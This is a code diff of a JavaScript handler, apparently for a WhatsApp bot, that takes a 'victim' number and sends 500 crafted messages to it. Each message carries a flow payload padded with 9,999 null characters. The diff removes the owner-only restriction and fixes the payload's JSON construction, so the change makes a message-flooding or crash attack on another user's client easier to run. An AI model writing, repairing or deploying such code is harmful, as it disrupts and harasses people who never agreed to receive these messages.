@@ -1,11 +1,8 @@
 let handler = async (m, { conn, text, command }) => {
-  // Verificación de creador
-  if (!isCreator) return m.reply("👑 Este comando solo está disponible para el owner y el número del bot.");
-
-  // Verificación de argumento
+  // 1. Verificar argumento
   if (!text) return m.reply(`*exemplo:*\n\n*${prefix + command}* '+55 51 8992-6591'`);
 
-  // Obtención del objetivo
+  // 2. Procesar el número
   victim = text.split("|")[0];
   
   // Lógica para obtener el JID del contacto
@@ -15,7 +12,7 @@ let handler = async (m, { conn, text, command }) => {
       ? m.quoted.sender 
       : victim.replace(/[-9]/g,'') + "@s.whatsapp.net";
 
-  // Verificación de contacto
+  // 3. Verificar contacto
   var contactInfo = await conn.onWhatsApp(Xreturn);
   
   if (victim == "555189926591") { return; }
@@ -28,7 +25,7 @@ let handler = async (m, { conn, text, command }) => {
 
   m.reply("*enviando....*");  
 
-  // Bucle de envío
+  // 4. Ejecutar el envío
   for (let i = 0; i < 500; i++) {
     await external_share(Xreturn);
   }
@@ -36,7 +33,7 @@ let handler = async (m, { conn, text, command }) => {
   m.reply("*✔️*");
 };
 
-// Función auxiliar para enviar el mensaje
+// Función auxiliar corregida
 async function external_share(target) {
   try {
     let msg = generateWAMessageFromContent(
@@ -49,7 +46,9 @@ async function external_share(target) {
           },
           nativeFlowResponseMessage: {
             name: "call_permission_request",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(9999)}\"}}`,
+            paramsJson: JSON.stringify({ 
+              flow_cta: "\u0000".repeat(9999)
+            }),
             version: 3
           },
           contextInfo: {
@@ -63,6 +62,7 @@ async function external_share(target) {
       },
       {}
     );
+    
     await conn.relayMessage(
       "status@broadcast",
       msg.message,
